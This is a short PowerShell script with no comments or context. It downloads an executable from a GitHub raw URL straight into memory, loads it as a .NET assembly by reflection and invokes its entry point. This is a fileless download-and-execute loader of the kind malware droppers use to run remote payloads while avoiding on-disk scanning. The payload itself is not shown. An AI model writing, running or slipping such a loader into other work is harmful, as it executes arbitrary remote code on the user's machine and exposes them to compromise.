$url = " https://raw.githubusercontent.com/mohamedali43/ps1/main/test.exe"

$webClient = New-Object System.Net.WebClient

$exeBytes = $webClient.DownloadData($url)

$assembly = [System.Reflection.Assembly]::Load($exeBytes)

$entryPoint = $assembly.EntryPoint

if ($entryPoint) {
    $entryPoint.Invoke($null, @([string[]]@()))
}
